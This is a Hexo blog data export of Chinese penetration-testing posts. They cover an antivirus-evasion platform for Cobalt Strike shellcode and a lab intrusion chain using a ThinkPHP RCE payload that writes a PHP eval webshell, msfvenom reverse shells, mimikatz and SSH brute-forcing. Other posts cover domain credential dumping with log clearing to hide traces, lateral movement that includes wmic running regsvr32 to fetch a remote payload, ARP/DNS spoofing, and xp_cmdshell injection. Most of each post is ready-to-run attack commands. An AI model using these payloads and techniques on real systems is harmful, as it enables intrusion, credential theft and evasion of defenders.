{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"PEI-Bypass 免杀平台","slug":"PEI-Bypass免杀平台","date":"2020-12-22T04:00:00.000Z","updated":"2020-12-22T12:53:17.655Z","comments":true,"path":"2020/12/22/PEI-Bypass免杀平台/","link":"","permalink":"http://yoursite.com/2020/12/22/PEI-Bypass%E5%85%8D%E6%9D%80%E5%B9%B3%E5%8F%B0/","excerpt":"","text":"趁着上个周末好不容易的双休，写了个免杀平台，以实战为目的，不以 VT 全绿为目的，经测试国内常用杀软都可轻松绕过，包括静态查杀、动态查杀、云查杀。 用前必读 禁止将生成的免杀文件上传到 微步云沙箱、virustotal 等网站检测 个人测试服务器带宽很小，禁止扫描 测试时间 / 版本2020 年 12 月 22 日火绒（最新版：5.0.55.2）360杀毒/卫士（最新版：13.0.0.1001）电脑管家（最新版：13.6.20672.243） 生成 CS 马 cobalt strike 生成 python 的 shellcode 保存到本地 打开保存的 py 文件，ctrl + A 全选 打开免杀平台，粘贴上一步复制的 shellcode，点击”生成”按钮，默认以当前时间戳命名 免杀测试静态火绒 360 电脑管家 动态360 为例 上线 执行命令","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"免杀","slug":"免杀","permalink":"http://yoursite.com/tags/%E5%85%8D%E6%9D%80/"}]},{"title":"渗透三层网络","slug":"渗透三层内网","date":"2020-12-12T04:00:00.000Z","updated":"2020-12-15T14:58:21.882Z","comments":true,"path":"2020/12/12/渗透三层内网/","link":"","permalink":"http://yoursite.com/2020/12/12/%E6%B8%97%E9%80%8F%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/","excerpt":"","text":"前言最近做了一个靶场环境，难度不大，属于三层网络结构，从外网开始找到 web 漏洞一步步渗透到内网机器，这里做一个小结。 准备工作 攻击机器 公网 vps 渗透入口（公网）：http://xxx.xxx.x.xx:2780 目标机器1：xxx.xxx.x.xx浏览器访问这个地址 http://xxx.xxx.x.xx:2780，初步进行指纹识别 123web 服务器：apache 2.4.23系统：windows server后台语言：php 7.0.12 目录扫描 dirsearch 扫出不少目录 通过浏览器访问发现是用 Thinkphp 5.1 搭建的网站，这个版本有 exp 可以直接打 查看 phpinfo 1&#x2F;index.php&#x2F;?s&#x3D;index&#x2F;\\think\\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1 获取到网站根目录 写 webshell 1&#x2F;index.php&#x2F;?s&#x3D;index&#x2F;\\think\\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;lipei.php&amp;vars[1][]&#x3D;&lt;?php @eval($_POST[x]);?&gt; 写入后的路径在 http://xxx.xxx.x.xx:2780/public/lipei.php 蚁剑连接成功 whoami 发现直接就是 system 权限，不用提权了，成功拿下第一个机器 内网探测 ipconfig 查看 IP，发现当前机器的内网 IP 是 172.26.2.182，前面通过浏览器访问的是映射出去的外网 IP 测试的时候不知为何蚁剑频繁报错卡住，改用 msf 上线吧 生成 exe 木马并上传到目标机器（lhost 是 VPS 公网 IP） 1msfvenom -p windows/meterpreter/reverse_tcp lhost=49.xxx.xx.xxx lport=5555 -f exe &gt; pei_1.exe msf 开启监听 1234567891011msf5 &gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcpmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 127.0.0.1lhost =&gt; 127.0.0.1msf5 exploit(multi/handler) &gt; set lport 4444lport =&gt; 4444msf5 exploit(multi/handler) &gt; set exitonsession false exitonsession =&gt; falsemsf5 exploit(multi/handler) &gt; run -j 在蚁剑上启动木马，上线成功 使用 mimikatz 获取明文密码 12load mimikatz # 加载 mimikatz 模块wdigest # 获取明文密码 明文获取失败，哦前面上传木马的是 32 位的，系统是 64 位的 把进程注入到一个 64 位的以管理员权限运行的程序中，再获取明文 得到一个账号 1Administrator root 搭建好 frp 代理，用上面得到的账号登录远程桌面，但是失败了提示密码不对… 下面对内网的探测都需要设置好用 frp 搭建好的 socks 通道，win 上使用 socksCap64 等工具，linux 可以使用 proxychains 等工具 手动创建一个管理员账号，可以成功登录 使用 ping 命令探测一下同网段存活机器 1for &#x2F;l %i in (1,1,255) do @ ping 172.26.2.%i -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot; 在目标机器执行上面这条命令不知道为什么一直没有结果，于是上传一个 nbtscan.exe 到目标机器来扫描，探测到在两个网段内除本机之外的另外两个机器 arp -a 命令查看 arp 缓存发现两个网段内还有如下机器 再用 msf 的探测模块扫描了一番，最终整理一下，发现当前内网其他机器有五个 12345172.26.2.28172.26.2.174172.26.3.18172.26.3.75172.26.3.78 nmap 扫描端口，socks 通道不能代理 icmp 协议，所以要用 -Pn 参数禁用 ping 扫描 1proxychains nmap -sT -Pn -T4 172.26.2.28 172.26.2.174 172.26.3.18 172.26.3.75 172.26.3.78 结果如下 123456789101112131415161718192021222324252627# 172.26.2.2822&#x2F;tcp open ssh3389&#x2F;tcp open ms-wbt-server# 172.26.2.174135&#x2F;tcp open msrpc139&#x2F;tcp open netbios-ssn445&#x2F;tcp open microsoft-ds3389&#x2F;tcp open ms-wbt-server# 172.26.3.18135&#x2F;tcp open msrpc139&#x2F;tcp open netbios-ssn445&#x2F;tcp open microsoft-ds3389&#x2F;tcp open ms-wbt-server# 172.26.3.7522&#x2F;tcp open ssh111&#x2F;tcp open rpcbind7777&#x2F;tcp open cbt8009&#x2F;tcp open ajp138080&#x2F;tcp open http-proxy# 172.26.3.7822&#x2F;tcp open ssh7001&#x2F;tcp open afs3-callback7778&#x2F;tcp open interwise 发现里面有三个机器开了 22 端口，爆破一下 ssh，果然有一台 172.26.2.28 是弱口令 ssh 登录成功，是一台 kali，成功拿下第二个机器 目标机器二：172.26.2.174 / 172.26.3.18发现同网段另一个机器 172.26.2.174 和 172.26.3.18 都开放了 445 端口，测试一下 17-010 漏洞 确定这两个都存在 17010 漏洞 但是尝试了几次都是攻击失败 这俩机器还开了 3389 端口，通过 socks 通道打开远程桌面连接工具，使用前面收集到的那个密码试一下，额，都登录失败，密码好像不对 目标机器三：172.26.3.78这个机器开放了 7001 端口，是 weblogic 的默认端口，浏览器挂好代理访问发现确实是 weblogic 默认的 404 页面 经过探测存在几个 CVE 漏洞 访问 weblogic 的默认登录页面，版本是 10.3.6，后台语言是 jsp 1&#x2F;console&#x2F;login&#x2F;LoginForm.jsp CVE-2019-2725 来手工验证，确实存在 上传冰蝎的 jsp 马 webshell 连接成功，是 root 权限，拿下第三台机器 这个机器还存在 172.26.4.0/24 网段，先记录下来 目标机器四：172.26.3.75这个机器开放了 8080 端口，是个 web 服务 使用 vulmap 脚本探测后发现是 struts2 框架，并且存在 S2-045 漏洞 直接用该脚本自带的打 EXP 失败 换一个 struts2 利用工具，命令执行成功，当前是 root 权限，拿下第四个机器 上传冰蝎的 jsp 马 目标机器五：172.26.4.22 （第二层内网）在前面 welogic 那个机器上发现另一个 172.26.4.0/24 网段 上传 ping 检测内网存活主机的脚本，测试的时候网络好像很不稳定，上传成功并且给了执行权限，但是一直提示文件不存在 变通一下，生成一个 msf 的正向连接的木马上传到目标机器，可以成功弹回 session 然而….很快又断开连接了，估计还是网络不稳定 arp -a 查看网络缓存发现了另一个机器 172.26.4.22 现在还需要设置好第二层的 socks 代理，攻击机才能访问这个 4 网段的机器 12345678[common]server_addr &#x3D; 172.26.3.63server_port &#x3D; 7000[socks_2_3]type &#x3D; tcpremote_port &#x3D; 10067plugin &#x3D; socks5 上传 frpc 客户端到 weblogic 这个机器，配置文件内容如上，服务端的地址填写拿到的第一个机器的 172.26.3.63 网段的IP 前提：第一个机器上启动 frpc 客户段的时候设置好了，并且开启了一个 frps 服务端 设置 proxychains，nmap 扫描 1234567891011121314# 172.26.4.2221&#x2F;tcp open ftp80&#x2F;tcp open http135&#x2F;tcp open msrpc139&#x2F;tcp open netbios-ssn445&#x2F;tcp open microsoft-ds1025&#x2F;tcp open NFS-or-IIS1026&#x2F;tcp open LSA-or-nterm1027&#x2F;tcp open IIS1028&#x2F;tcp open unknown1045&#x2F;tcp open fpitp1046&#x2F;tcp open wfremotertm3306&#x2F;tcp open mysql3389&#x2F;tcp open ms-wbt-server 这个机器开放的端口挺多，80 端口是 web服务，浏览器设置好代理，访问发现是 thinkCMF 框架搭建的网站，版本是 2.2.0 这个版本有任意文件上传的漏洞，修改后直接请求就能写 webshell 成功https://mrxn.net/Infiltration/644.html 出现这个报错页面实际上已经写成功了，文件写在了网站根目录下 蚁剑设置好代理，连接 webshell，命令执行发现是 system权限，成功拿下第五台机器 整理一下网络拓扑图","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"内网穿透","slug":"内网穿透","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"域内密码凭证获取","slug":"域内密码凭证获取","date":"2020-12-10T04:00:00.000Z","updated":"2020-12-15T09:45:00.000Z","comments":true,"path":"2020/12/10/域内密码凭证获取/","link":"","permalink":"http://yoursite.com/2020/12/10/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/","excerpt":"","text":"前言渗透拿下域控后，就可以尝试获取域内得密码凭证等信息，其中主要涉及三个文件。 文件 作用 路径 SAM 存储本地账户的密码哈希 C:\\Windows\\System32\\config ntds.dit 活动目录数据库包括有关域用户、组和组成员身份的信息、以及括域中所有用户的密码哈希值 C:\\Windows\\NTDS SYSTEM 使用存储在 SYSTEM 注册表配置单元中的密钥对上面这些哈希值进行加密 C:\\Windows\\System32\\config 先把这些文件复制出来，然后用工具破解里面的密码哈希，但是 Windows 阻止对这些文件的标准读取或复制操作 因此必须使用特殊手段来获取副本，下面介绍两种方式，Volume Shadow Copy 和 NinjaCopy。 一、Volume Shadow Copy 注: 下面几个复制的方法中，有些是将 SYSTEM、SAM 直接复制出来，有些是复制并重命名为 system.hive、sam.hive，它们是一样的。 Volume Shadow Copy Service(卷影复制) 是微软从 Windows XP 开始提供的用于创建一致性的时间点副本（也就是快照）的服务框架。 用于数据备份 支持 Windows Server 2003 及以上操作系统 系统默认在特定条件下自动创建数据备份，如补丁安装后。在 Win7 系统大概每隔一周自动创建备份 禁用 VSS 会影响系统正常使用，如 System Restore 和 Windows Server Backup 可以调用卷影复制功能的工具有多种，有些是系统自带，有些是第三方工具，下面介绍几个常用的 Ntdsutil一个为 Active Directory 提供管理设施的命令行工具，域环境默认安装。 支持系统： Server 2003 Server 2008 Server 2012 1. 查询当前系统的快照1234ntdsutil snapshot \"List All\" quit quit#或者ntdsutil snapshot \"List Mounted\" quit quit 目前还没建立快照，所以结果为空 2. 创建快照1ntdsutil snapshot \"activate instance ntds\" create quit quit 创建成功，得到快照的 ID 3. 挂载快照使用上一步生成的快照 ID 进行挂载，下面的命令都使用这个 ID 1ntdsutil snapshot \"mount &#123;eb45ac69-43c5-4451-ace5-f02088ac1960&#125;\" quit quit 挂在成功后会在 C 盘个目录生成一个快照目录 该快照目录里面就是 C 盘的内容，可以进行复制 4. 复制 ntds.dit将 ntds.dit 文件复制出来 1copy C:\\$SNAP_202010142232_VOLUMEC$\\windows\\NTDS\\ntds.dit c:\\ntds2.dit 5. 卸载快照1ntdsutil snapshot \"unmount &#123;eb45ac69-43c5-4451-ace5-f02088ac1960&#125;\" quit quit 卸载完成以后可以看到 C 盘根目录的快照文件夹已被删除 6. 删除快照1ntdsutil snapshot \"delete &#123;eb45ac69-43c5-4451-ace5-f02088ac1960&#125;\" quit quit * 更快捷的 Ntdsutil 命令使用 Ntdsutil 还可以使用下面命令一次性将上面的命令执行完毕 1Ntdsutil \"activate instance ntds\" ifm \"create full C:\\pei\" quit quit 如下图，执行命令后自动 创建快照 -&gt; 挂载快照 -&gt; 复制文件 -&gt; 卸载快照 -&gt; 删除快照 ntds.dit 文件和 SYSTEM 文件已经被复制到 C 盘根目录的 pei 文件夹内 vssadmin它是 Windows 系统提供的卷影复制服务(VSS)的管理工具，域环境默认安装。 用于创建或删除卷影副本，列出卷影副本的信息 用于显示所有安装的所有卷影副本写入程序和提供程序 改变卷影副本存储空间的大小等 1. 查询当前系统的快照这里还没创建快照，结果为空 1vssadmin list shadows 2. 创建快照1vssadmin create shadow /for=c: 获得卷影副本的名称：\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy5 3. 复制ntds.dit1copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy5\\windows\\NTDS\\ntds.dit c:\\ntds3.dit windows 目录前面就是上一步获得的卷影副本的名称 4. 删除快照1vssadmin delete shadows &#x2F;for&#x3D;c: &#x2F;quiet vshadow是一个简单的指令行工具，它允许任何人创建卷影拷贝。不是系统自带的，可在Microsoft Windows Software Development Kit (SDK)中获得该工具。 这个工具还没下载，待补充… 注意事项以上三个工具的原理都是调用 Volume Shadow Copy 服务，调用卷影复制服务会产生日志文件，位于 System(系统) 下，事件 ID 为 7036 ，执行 ntdsutil snapshot “activate instance ntds” create quit quit 还会额外产生事件 ID 为 98 的日志文件，如下图 所以在进行完卷影复制的操作后记得清理日志以免留下痕迹，清理命令： 12# 这里清理的是 system 日志wevtutil cl system 二、NinjaCopy1234567891011# 加载 NinjaCopy 脚本Import-Module .\\invoke-NinjaCopy.ps1# 复制 SAM 文件Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestination \"C:\\sam.hive\"# 复制 SYSTEM 文件Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SYSTEM -LocalDestination \"C:\\system.hive\"# 复制 ntds.ditInvoke-NinjaCopy -Path C:\\windows\\ntds\\ntds.dit -LocalDestination \"C:\\ntds.dit\" 在后渗透的阶段，通常是使用 cs 获得域控机器权限的，cs 里通过 powershell 命令执行 powershell 脚本，上面的几条命令在 cs 里执行分别就是 1234567# 加载 NinjaCopy 脚本powershell-import .\\invoke-NinjaCopy.ps1# 在执行脚本的前面加上 powershellpowershell Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestination \"C:\\sam.hive\"powershell Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SYSTEM -LocalDestination \"C:\\system.hive\"powershell Invoke-NinjaCopy -Path C:\\windows\\ntds\\ntds.dit -LocalDestination \"C:\\ntds.dit\" 三、破解文件获得密码哈希前面两部分都是介绍如何突破不能复制的限制从域控机器上获取 SAM、SYSTEM、ntds.dit 文件，得到以后就需要把里面的内容解密，获得密码哈希值 1. QuarkPwDump 这是一款开放源代码的 Windows 用户凭据提取工具，它可以抓取 Windows 平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。 下载地址：https://github.com/PegasusLab/QuarksPwDump-off-line 把 QuarkPwDump.exe 和 ntds.dit 放在一个目录 ① 首先修复复制出来的数据库文件1esentutl /p /o ntds.dit 修复完成后会多出来两个文件如下图 ② 使用 QuarksPwDump 直接读取预备用户密码哈希1QuarksPwDump.exe --dump-hash-domain --ntds-file ntds.dit --output attack.local.txt 加上 –output 参数可以导出到文本中 1QuarksPwDump.exe --dump-hash-domain --ntds-file ntds.dit --output attack.local.txt 2. Secretsdump这个工具可以从 impacket-examples-windows 套件中获得 将 secretsdump.exe 和 ntds.dit、system.hive、sam.hive、SECURITY 放在一个目录 12# 破解 sam 文件，获取本地的密码哈希secretsdump.exe -sam sam.hive -security SECURITY -system system.hiv LOCAL 12# 破解 ntds.dit 文件，获取域内所有用户的密码哈希，包括上面本地的 administratorsecretsdump.exe -system system.hive -ntds ntds.dit LOCAL 3. NtdsAudit下载地址：https://github.com/Dionach/NtdsAudit/releases 把 NtdsAudit.exe、ntds.dit、system.hive 放在一个目录内 1NtdsAudit.exe \"ntds.dit\" -s \"system.hive\" -p pwdump.txt --users-csv users.csv 4. 神器 mimikatz使用 mimikatz 的话就不需要提前复制那些文件了，神器就是神器，简单了很多，直接用它的 dcsync 功能，这个功能直接利用目录复制服务（Directory Replication Service, DRS）从 ntds.dit 文件中提取密码哈希值。 ① 通过 dcsync 直接获取 attack.local 域内所有用户哈希1lsadump::dcsync /domain:attack.local /all /csv ② 获取单个用户的详细信息12# 获取 attack 域内 test1 用户的信息lsadump::dcsync /domain:attack.local /user:test1 ③ 获取所有用户的详细信息1lsadump::lsa /inject 经过一系列的操作拿到域内用户的密码哈希后，就可以去一些在线网站解密或者本地的哈希解密工具解密出明文密码，从而持久的控制目标机器","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"域控","slug":"域控","permalink":"http://yoursite.com/tags/%E5%9F%9F%E6%8E%A7/"},{"name":"密码凭证","slug":"密码凭证","permalink":"http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81/"}]},{"title":"后渗透之横向移动（一）","slug":"后渗透之横向移动（一）","date":"2020-10-18T04:00:00.000Z","updated":"2020-12-10T13:48:45.304Z","comments":true,"path":"2020/10/18/后渗透之横向移动（一）/","link":"","permalink":"http://yoursite.com/2020/10/18/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"前言在前期拿到第一台目标机器后，通过信息收集获得目标机器的本地账号或者域账号等，然后在横向的时候利用收集到的账号去尝试登陆更多内网机器。 本篇内容介绍几种我常用的通过 Windows 自带的命令或工具去横向移动的方式，在下一篇文章再写一写通过第三方工具横向移动的方式，其实万变不离其宗，理解其中的原理就能融会贯通。 一、 IPC + Schtasks简介IPC$ - (Internet Process Connection) 是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 Schtasks - Windows 自带的创建计划任务的命令。 利用条件 开放了 139、445 端口 目标开启 IPC$ 文件共享服务 需要目标机器的管理员账号和密码 常用命令 IPC 连接 1234net use \\\\10.10.1.130\\ipc$ &#x2F;user:administrator &quot;passwd@123&quot;#域内账户net use \\\\10.10.1.130\\ipc$ &#x2F;user:attack\\administrator &quot;passwd@123&quot; 查看连接情况 1net use 查看目标主机时间 1net time \\\\10.10.1.130 删除连接 1net use \\\\10.10.1.130\\ipc$ &#x2F;del 文件上传下载 12345# 从当前机器复制到目标机器copy shell.exe \\\\10.10.1.130\\c$\\windows\\temp\\shell.exe# 从目标机器复制到当前机器copy \\\\10.10.1.130\\c$\\shell.exe c:\\ 查看目标机器文件 1dir \\\\10.10.1.130\\c$ schtasks 命令创建计划任务 1schtasks &#x2F;create &#x2F;s 10.10.1.130 &#x2F;u attack\\administrator &#x2F;p &quot;passwd@123&quot; &#x2F;sc MINUTE &#x2F;mo 1 &#x2F;tn test1 &#x2F;tr &quot;c:\\shell.exe&quot; msf 设置好监听，目标机器到计划任务设置的时间后自动启动 shell.exe 木马，反弹 shell 成功 删除计划任务 1schtasks &#x2F;delete &#x2F;s 10.10.1.130 &#x2F;u attack\\administrator &#x2F;p &quot;passwd@123&quot; &#x2F;tn test1 二、 IPC + SC先通过 IPC 通道将木马文件复制到目标机器，然后使用 sc 创建服务执行 12345678# 创建服务sc \\\\10.10.1.130 create test binpath=\"c:\\shell.exe\" obj=\"attack\\administrator\" password=passwd@123# 查询服务sc \\\\10.10.1.130 qc test# 启动服务，需要管理员权限sc \\\\10.10.1.130 start test 注：sc 启动服务需要管理员权限 三、 WMIC 先通过 IPC 通道将木马文件复制到目标机器，然后使用 WMIC 命令启动程序，执行速度较慢，多等一会儿 1wmic &#x2F;node:10.10.1.130 &#x2F;user:attack\\administrator &#x2F;password:passwd@123 process call create &quot;cmd &#x2F;c c:\\shell.exe&quot; 也可以直接通过首先通过 web_delivery 得到 shell，在 msf 或者 cs 创建一个 web_delivery 的 payload，然后修改到如下命令的引号内，可以是 powershell，regsvr32 等，这里以 regsvr32 为例 1wmic &#x2F;node:10.10.1.130 &#x2F;user:attack\\administrator &#x2F;password:passwd@123 process call create &quot;regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.78.117:8080&#x2F;feY7nzY.sct scrobj.dll&quot; 四、 WinRM简介WinRM 指的是 Windows 远程管理服务，通过远程连接 winRM 模块可以操作 windows 命令行，默认监听端口 5985（HTTP）/ 5986 (HTTPS)，在 2012 及以后默认开启。 先通过 IPC 通道将木马文件复制到目标机器，然后使用 WMIC 命令创建进程或者服务，执行速度较慢，多等一会儿 常用命令 判断是否开启WinRM服务 1winrm enumerate winrm&#x2F;config&#x2F;listener 命令开启WinRM服务 1winrm quickconfig 允许远程主机访问及访问远程主机 1winrm set winrm&#x2F;config&#x2F;client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125; 使用 winrs 命令在目标机器执行远程命令 12345# 执行系统命令winrs -r:http:&#x2F;&#x2F;10.10.1.130:5985 -u:attack\\administrator -p:passwd@123 ipconfig# 运行木马文件winrs -r:http:&#x2F;&#x2F;10.10.1.130:5985 -u:attack\\administrator -p:passwd@123 c:\\windows\\temp\\shell.exe 使用 winrm 命令在目标机器执行远程命令 利用 winrm 参数选项中的 invoke 参数，来对目标对象执行特定的方法，以下命令分别是创建进程和创建服务，任选其一即可 12# 在目标机器创建进程，运行木马文件 shell.exewinrm invoke create wmicimv2&#x2F;win32_process @&#123;Commandline&#x3D;&quot;shell.exe&quot;&#125; -r:http:&#x2F;&#x2F;10.10.1.130:5985 -u:attack\\administrator -p:passwd@123 12345# 在目标机器上创建一个名为 test 的服务winrm invoke Create wmicimv2&#x2F;Win32_Service @&#123;Name&#x3D;&quot;test&quot;;DisplayName&#x3D;&quot;test123&quot;;PathName&#x3D;&quot;cmd.exe &#x2F;k c:\\shell.exe&quot;&#125; -r:http:&#x2F;&#x2F;10.10.1.130:5985 -u:attack\\administrator -p:passwd@123# 将上面一条命令创建的服务 test 启动winrm invoke StartService wmicimv2&#x2F;Win32_Service?Name&#x3D;test -r:http:&#x2F;&#x2F;10.10.1.130:5985 -u:attack\\administrator -p:passwd@123","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"中间人攻击的原理和应用","slug":"中间人攻击的原理和应用","date":"2020-10-15T04:00:00.000Z","updated":"2020-12-09T01:26:27.855Z","comments":true,"path":"2020/10/15/中间人攻击的原理和应用/","link":"","permalink":"http://yoursite.com/2020/10/15/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%BA%94%E7%94%A8/","excerpt":"","text":"中间人攻击的原理首先需要理解为什么会产生中间人攻击，是通过什么原理实现的，这里主要用到 ARP 协议和 DNS 协议。 ARP 协议及欺骗产生的原理地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗 网关网关(Gateway)又称网间连接器、协议转换器。网关在网络层以上实现网络互连，是复杂的网络互连设备，仅用于两个高层协议不同的网络互连。网关既可以用于广域网互连，也可以用于局域网互连。 网关是一种充当转换重任的计算机系统或设备。使用在不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。同层–应用层，简单的来说你电脑如果要上网需要通过网关，流量都会经过网关，攻击者只需要利用arp欺骗把自己主机伪装成网关，那么其他电脑的流量就会经过攻击者的主机。 DNS 协议DNS即Domain Name System 的缩写，是把主机域名解析IP地址的系统，解决了IP地址难记的问题，用相对好记的域名就可以对服务器进行访问，即使服务器更换了IP地址，我们依旧可以通过域名访问该服务器，这样能够使我们更方便的访问互联网。 DNS 欺骗的原理DNS欺骗就是利用了DNS协议设计时的一个非常严重的安全缺陷。首先欺骗者向目标机器发送构造好的ARP应答数据包，ARP欺骗成功后，嗅探到对方发出的DNS请求数据包，分析数据包取得ID和端口号后，向目标发送自己构造好的一个DNS返回包，对方收到DNS应答包后，发现ID和端口号全部正确，即把返回数据包中的域名和对应的IP地址保存进DNS缓存表中，而后来的当真实的DNS应答包返回时则被丢弃 中间人攻击的应用场景1. 场景一（DNS 劫持跳转到指定网站）通过这种方式，受害人主动或者被诱导访问指定域名后自动跳转到设置好的恶意地址，从而进一步对目标进行钓鱼，社工等进深入渗透。 可以进行流量欺骗的工具有很多，这里以 ettercap 为例，在 kali 打开 ettercap 1ettercap -G 选择网卡，点击对勾确定 先点击搜索按钮 Scan for hosts 搜索局域网内的机器，再点击主机列表按钮 Hosts list 展示搜索到的机器 将网关机器添加到 target 1，将目标机器添加到 target 2 开启 ARP 欺骗，开启后目标机器的流量都会通过 kali 攻击机 (kali 伪装成了网关) 在 /etc/ettercap/etter.dns 文件最后面添加这么一行并保存，意思是目标机器访问所有百度的域名实际上都访问到攻击机器的 IP 192.168.0.105 1*.baidu.com A 192.168.0.105 开启 DNS 欺骗，依次点击 menu - Plugins - Manage plugins - dns_spoof， 双击这个 dns 欺骗插件，选择成功后插件前面会有个星号 然后点击 ettercap 左上角按钮开启欺骗(软件打开时默认是开启的就不用管) 在目标机器访问百度的主页，在攻击机上看到目标机器的请求 同时发现目标机器自动跳转到了必应的主页 这是因为在 /etc/ettercap/etter.dns 设置了访问百度域名自动跳转到 192.168.0.105机器，在 192.168.0.105 我开启了apache web 服务，并在 web 目录下存放了一个 index.html 文件，文件内容是打开后自动跳转到必应 1234&lt;head runat=\"server\"&gt; &lt;title&gt;&lt;/title&gt; &lt;meta http-equiv=\"refresh\" content=\"0;url=http://cn.bing.com\"/&gt;&lt;/head&gt; 2. 场景二（DNS 劫持拿下 shell）msf 设置监听，使用 ms14-064 模块攻击 IE 浏览器 、 设置好参数后执行，生成一个攻击 URL，复制到上面场景一中的 web 目录下的 index.html 文件里面 再次让目标机器去访问百度，msf 拿到 shell 3. 场景三（盗取目标用户的账号密码）ARP 欺骗可以抓到目标机器 HTTP 的包，在目标机器打开一个使用 http 的网站并登录，在 kali 攻击机的 ettercap 日志就能直接看到登录提交的数据包，抓到受害者的账号密码 4. 场景四（抓取目标机器访问的网站图片）安装 driftnet 1apt-get install driftnet 指定网卡监听 1driftnet -i eth0 5. dns欺骗深入利用：可以利用来钓鱼，组合浏览器漏洞组合 csrf 组合 xss（beef上线）配合 msf 等一系列漏洞。 防御dns欺骗 使用最新版本的DNS服务器软件，及时安装补丁 关闭DNS服务器的递归功能 限制区域传输范围 限制动态更新 采用分层的DNS体系结构 采用https","categories":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"数据库提权(二) sql server 提权","slug":"数据库提权(二) sql server 提权","date":"2020-10-09T04:00:00.000Z","updated":"2020-11-27T13:13:56.188Z","comments":true,"path":"2020/10/09/数据库提权(二) sql server 提权/","link":"","permalink":"http://yoursite.com/2020/10/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%BA%8C)%20sql%20server%20%E6%8F%90%E6%9D%83/","excerpt":"","text":"简介xp_cmdshell 能将命令字符串作为操作系统的命令执行，并以文本行的形式返回执行结果，用户可以利用此方法来执行任意系统命令。 语法为： 1exec master..xp_cmdshell \"dos命令\" 利用前提条件 是管理员账号 xp_cmdshell 存在 xp_cmdshell 已开启 (SQL Server 2005 及以上版本默认关闭) 若服务未开启，执行 xp_cmdshell 命令会出现如下提示 1消息 15281，级别 16，状态 1，过程 xp_cmdshell，第 1 行 提权步骤 这个地址存在 sql 注入，探测是否存在注入不再赘述，直接从提权开始 1. 判断是否是管理员只有 sysadmin 组的用户才能执行 xp_cmdshell，用以下注入语句判断用户是否为 sysadmin 组的用户 1and (select IS_SRVROLEMEMBER (&#39;sysadmin&#39;))&#x3D;1--+ 没有报错正常返回，说明 select IS_SRVROLEMEMBER (&#39;sysadmin&#39;)=1 的结果为真，也就是说数据库的用户属于 sysadmin 管理员组。如果页面没有正常返回，说明用户不属于 sysadmin 组，则无法提权，就不用继续进行后面的操作了。 